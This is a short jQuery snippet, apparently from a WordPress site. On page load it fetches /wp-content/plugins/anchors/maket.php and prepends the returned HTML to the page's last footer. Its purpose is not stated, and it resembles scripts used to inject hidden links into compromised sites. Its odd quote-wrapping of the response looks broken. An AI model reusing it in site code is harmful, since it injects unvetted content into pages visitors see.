jQuery(function($){
  $.get("/wp-content/plugins/anchors/maket.php",function(res) {
        $("'"+res+"'").prependTo("footer:last");
  });
})